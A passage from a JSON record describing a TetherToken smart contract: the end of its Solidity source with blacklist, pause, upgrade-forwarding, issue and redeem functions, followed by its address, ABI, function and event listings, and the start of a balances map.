}\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        